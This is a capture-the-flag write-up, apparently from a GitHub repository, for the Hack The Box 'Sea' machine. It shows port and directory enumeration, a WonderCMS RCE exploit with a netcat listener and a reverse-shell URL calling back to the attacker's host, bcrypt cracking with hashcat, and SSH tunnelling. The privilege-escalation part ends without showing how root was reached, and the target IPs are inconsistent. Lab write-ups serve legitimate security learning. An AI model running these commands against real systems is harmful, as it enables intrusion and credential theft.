
![Logo](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/Logo.png)


# Sea HTB

Alright, let’s break this down step by step. This is an Easy machine on Hack The Box. Whether you’re new or experienced, follow along and learn. Let’s dive in.


## Enumeration

#### nmap

First step in any pentest: Enumeration. We need to map the attack surface.

Port Scanning with nmap
Using `nmap`, we scan all ports for open services and gather as much information as possible. Here's the command:

```sh
  sudo nmap -sS -sVC -Pn -A --min-rate 5000 -n -p- 10.10.11.38 -oN nmap.txt
```

 * -sS: Stealth scan.
 * -sVC: Script scan with service and version detection.
 * -Pn: Skip ping checks. Assume the host is up.
 * -A: Aggressive mode for OS detection and more.
 * --min-rate 5000: Ensures fast scanning by sending at least 5000 packets/second.
 * -p-: Scan all ports.


![nmap](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/nmap.png)

| Puerto | Protocolo     | Description                |
| :-------- | :------- | :------------------------- |
| `22` | `SSH` | Secure protocol for remote access. |
| `80` | `http` | Unencrypted web service (default webpage). |

I opened the browser and navigated to `http://10.10.11.38`. It’s a basic webpage about bicycles. No immediate vulnerabilities were visible. Time to move deeper.

![PrincipalPage](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/PrincipalPage.png)

Using Gobuster, I performed a directory enumeration to find hidden resources:

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -u http://10.10.11.28
```

![Gobuster1](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/gobuster_FirstDir.png)

Directory by directory, deeper and deeper. Eventually, this:

```sh
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt  -t 50 -u http://10.10.11.28/themes/bike/
```

<div style="display: flex; justify-content: space-around; align-items: center; gap: 10px;">
  <img src="https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/gobuster_SecondDir.png" alt="Gobuster2" width="45%">
  <img src="https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/gobuster_3Dir.png" alt="Gobuster3" width="45%">
</div>

Using quickhits.txt (a smaller, faster wordlist), I found the CMS in use: WonderCMS v3.2.0.

## Ataquing
Before moving forward, add the target’s IP and hostname to `/etc/hosts`.

![hosts](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/hosts.png)

Didn’t notice it earlier, but there’s a Contact link on the site.

![ContactLink](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/How%20to%20participate.png)

Perfect, a form. Let’s hunt for vulnerabilities. Actually, no need—I've already got the exploit [WonderCMS Authenticated RCE - CVE-2023-41425.](https://github.com/Diegomjx/CVE-2023-41425-WonderCMS-Authenticated-RCE)

![Contact](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/Contact.png)

Executing the Exploit

```sh
python3 exploit.py http://sea.htb/loginURL <YOUR_IP> 4444
```
Start your listener:
```sh
nc -lvnp 4444
```
![CVE](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/MyCVE.png)

Fill out the contact form with the exploit payload. 

![Attack](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/Attackingtheform.png)

After a few seconds (or minutes) the exploit will look like this.

![Exploit](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/Exploit2.png)

Visit this URL in your browser:

```sh
http://sea.htb/themes/revshell-main/rev.php?lhost=<YOUR_IP>&lport=4444
```

![www-data](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/www-data.png)

For a better shell, spawn a TTY:```python3 -c "import pty;pty.spawn('/bin/bash')"``` 

While poking around the web directory, I found `data.js`. 

![webfiles](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/webfiles.png)

Inside, there’s a bcrypt hash. Time to crack it.

![thehash](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/thehash.png)

Use hashcat with the `rockyou.txt` wordlist:

```sh
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![hashcat](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/hashcat.png)

Once cracked, you’ll get the password.

Log in using the cracked credentials. Finding the username is simple: check `/home/`. Only two users exist—trial and error reveals the match.

```sh
ssh amay@10.10.11.28
```
You’re in. Time to escalate privileges.

## Privilege Scaletion

For privilege escalation, I started by checking active network connections and open ports on the system. If nothing useful came up, my fallback plan was to analyze running processes and, as a last resort, run LinPEAS for a full enumeration sweep.

```sh
netstat -tulpn
```
![netstat](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/netstat.png)

Port 8080 caught my attention—just like the last lab. To investigate further, I created an SSH tunnel to forward this port locally for easier analysis:

```sh
ssh -L 7000:127.0.0.1:8080 amay@10.10.11.28
```

Accessing http://127.0.0.1:7000 with the same credentials revealed this interface:

![page7000](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/page7000.png)

Upon logging in:

![page70002](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/Systemmonitoring.png)

The interface looked promising, but after exploring, I couldn’t find a spot for command injection. So, I switched to Burp Suite for deeper inspection.

![Burp1](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/analice1Burp.png)

Burp revealed something interesting. It appears the application compares files during requests. If the files differ, they’re flagged as suspicious.

No changes detected:
![Burp2](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/FirstTry.png)

Changes detected:
![Burp3](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/Sea/Image/SecondTry.png)

We already have the root flag, if you are wondering where the user flag is, it is located in amay's home page.







